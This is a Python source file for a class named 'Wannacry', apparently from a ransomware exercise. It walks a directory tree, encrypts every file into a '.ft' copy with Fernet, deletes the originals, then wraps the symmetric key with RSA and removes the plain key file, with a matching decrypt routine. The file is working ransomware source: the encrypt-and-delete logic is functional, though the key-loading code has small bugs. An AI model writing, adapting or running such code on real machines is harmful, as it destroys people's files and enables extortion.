import os

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, RSAPublicKey

from crypto import encrypt_symmetric_key, generate_symmetric_key, generate_private_key, generate_public_key, load_symmetric_key, load_private_key, load_public_key, decrypt_symmetric_key
from logger import log_info, log_title, log_error

class Wannacry:
    fernet: Fernet = None
    private_key: RSAPrivateKey
    public_key: RSAPublicKey

    def __init__(self, is_create=False):
        if (is_create):
            if not self.__load_key__():
                log_title('Generating new Keys')
                self.__generate_key__()
        else:
            log_title('Loading Keys')
            self.__load_key__()
    
    def encrypt(self, path: str):
        for root, dirs, files in os.walk(path, topdown=False):
            if self.__ignore_dir__(root):
                continue
            for name in files:
                filename = os.path.join(root, name)
                extension = os.path.splitext(filename)[1]
                if extension == '.ft':
                    continue
                self.__encrypt_file__(filename)
                os.remove(filename)
        self.__to_hybrid_key__()

    def decrypt(self, path: str):
        for root, dirs, files in os.walk(path, topdown=False):
            if self.__ignore_dir__(root):
                continue
            for name in files:
                filename = os.path.join(root, name)
                extension = os.path.splitext(filename)[1]
                if extension != '.ft':
                    continue
                log_title(f'Decrypting: {filename}')
                self.__decrypt_file__(filename)
                os.remove(filename)

    def __ignore_dir__(self, dir):
        ignore_dirs = ['.local/bin', '.local/lib']
        for ignore in ignore_dirs:
            if ignore in dir:
                return True
        return False

    def __encrypt_file__(self, filename: str):
        try:
            with open(filename, 'rb') as file:
                token = self.fernet.encrypt(file.read())
            new_filename = f'{filename}.ft'
            with open(new_filename, 'wb') as nf:
                nf.write(token)
            log_info(key="Encrypted:" , message=filename)
        except Exception as e:
            log_error(e)

    def __decrypt_file__(self, filename: str):
        try:
            original_filename = os.path.splitext(filename)[0]
            with open(filename, 'rb') as file:
                byte_data = self.fernet.decrypt(file.read())
            new_filename = f'{original_filename}'
            with open(new_filename, 'wb') as nf:
                nf.write(byte_data)
            log_info(key="Decrypted:" , message=filename)
        except Exception as e:
            log_error(e)
    
    def __load_key__(self):
        self.private_key = load_private_key()
        self.public_key = load_public_key()
        if not self.public_key or not self.private_key:
            return False
        self.fernet = self.__from_hybrid_key__()

    def __generate_key__(self):
        self.fernet = generate_symmetric_key()
        self.private_key = generate_private_key()
        self.public_key = generate_public_key(self.private_key)
        encrypt_symmetric_key()

    def __to_hybrid_key__(self):
        hybrid_key_filename = os.environ.get('STOCKHOLM_HYBRID_KEY', 'hybrid.pem')
        symmetric_key_filename = os.environ.get('STOCKHOLM_SYMMETRIC_KEY', 'symmetric.key')
        if not os.path.isfile(hybrid_key_filename):
            log_title('Encrypting symmetric key')
            encrypt_symmetric_key()
        if os.path.isfile(symmetric_key_filename):
            os.remove(symmetric_key_filename)
    
    def __from_hybrid_key__(self):
        decrypt_symmetric_key()
        return load_symmetric_key()